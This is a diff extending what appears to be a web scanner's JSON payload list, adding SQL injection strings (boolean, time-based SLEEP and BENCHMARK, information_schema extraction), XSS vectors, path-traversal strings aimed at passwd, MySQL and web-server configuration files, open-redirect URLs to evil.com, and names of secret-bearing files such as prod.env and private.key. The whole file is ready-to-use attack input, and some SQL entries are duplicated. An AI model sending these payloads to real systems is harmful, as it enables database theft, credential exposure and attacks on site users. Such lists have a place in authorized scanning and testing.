@@ -24,7 +24,44 @@
     "1' OR 1=1--",
     "1' AND 1=1--",
     "1' AND 1=2--",
-    "' OR 'x'='x"
+    "' OR 'x'='x",
+    "' OR 'x'='y",
+    "' AND 'x'='x",
+    "' AND 'x'='y",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR 'a'='a'--",
+    "' OR 'a'='a'/*",
+    "' OR 'a'='a'#",
+    "' AND 'a'='a'--",
+    "' AND 'a'='a'/*",
+    "' AND 'a'='a'#",
+    "' OR SLEEP(10)--",
+    "' OR SLEEP(15)--",
+    "' OR SLEEP(20)--",
+    "' OR IF(1=1,SLEEP(5),0)--",
+    "' OR IF(1=0,SLEEP(5),0)--",
+    "' OR IF(1=1,BENCHMARK(5000000,MD5(1)),0)--",
+    "' OR IF(1=0,BENCHMARK(5000000,MD5(1)),0)--",
+    "' OR LENGTH((SELECT database()))>0--",
+    "' OR LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))>0--",
+    "' OR SUBSTRING((SELECT database()),1,1)='a'--",
+    "' OR SUBSTRING((SELECT database()),1,1)='b'--",
+    "' OR SLEEP(3) AND '1'='1",
+    "' OR SLEEP(3) AND '1'='2",
+    "1' OR '1'='1'--",
+    "1' OR '1'='1'/*",
+    "1' OR '1'='1'#",
+    "1' AND 1=1--",
+    "1' AND 1=2--",
+    "' OR 1=1--+",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR '1'='1'#",
+    "' OR '1'='1'/*",
+    "' OR '1'='1'--",
+    "' OR '1'='1' AND '1'='1",
+    "' OR '1'='1' AND '1'='2"
   ],
   "XSS": [
     "<script>alert('XSS')</script>",
@@ -42,7 +79,16 @@
     "<embed src='javascript:alert(1)'>",
     "<link rel='stylesheet' href='javascript:alert(1)'>",
     "<base href='javascript:alert(1)'>",
-    "<form action='javascript:alert(1)'>"
+    "<form action='javascript:alert(1)'>",
+    "<audio src='javascript:alert(1)'>",
+    "<video src='javascript:alert(1)'>",
+    "<input type='text' value='<script>alert(1)</script>'>",
+    "<textarea><script>alert(1)</script></textarea>",
+    "<button onclick='alert(1)'>Click me</button>",
+    "<a href='javascript:alert(1)'>Link</a>",
+    "<div onmouseover='alert(1)'>Hover</div>",
+    "<span onfocus='alert(1)' tabindex='0'>Focus</span>",
+    "<img src=x onerror=alert(1)//>"
   ],
   "LFI": [
     "../../etc/passwd",
@@ -60,7 +106,11 @@
     "../../../../../../../../../../etc/hosts",
     "../../../../../../../../../../etc/group",
     "../../../../../../../../../../etc/sudoers",
-    "../../../../../../../../../../var/log/messages"
+    "../../../../../../../../../../var/log/messages",
+    "../../../../../../../../../../etc/httpd/conf/httpd.conf",
+    "../../../../../../../../../../etc/mysql/my.cnf",
+    "../../../../../../../../../../etc/nginx/nginx.conf",
+    "../../../../../../../../../../var/www/html/.htaccess"
   ],
   "OpenRedirect": [
     "https://evil.com",
@@ -73,7 +123,10 @@
     "/callback?redirect=https://evil.com",
     "/auth?next=https://evil.com",
     "/redirect.php?url=https://evil.com",
-    "/redirect.php?target=https://evil.com"
+    "/redirect.php?target=https://evil.com",
+    "/redirect.jsp?url=https://evil.com",
+    "/redirect.aspx?url=https://evil.com",
+    "/redirect.cgi?url=https://evil.com"
   ],
   "SensitiveFiles": [
     "robots.txt",
@@ -95,6 +148,17 @@
     ".htaccess",
     "private.pem",
     "passwords.txt",
-    "user.txt"
+    "user.txt",
+    "db_backup.sql",
+    "mysql.sql",
+    "config.json",
+    "settings.py",
+    "local_settings.py",
+    "prod.env",
+    "development.env",
+    "keys.pem",
+    "private.key",
+    "secret.env",
+    "config.ini"
   ]
 }
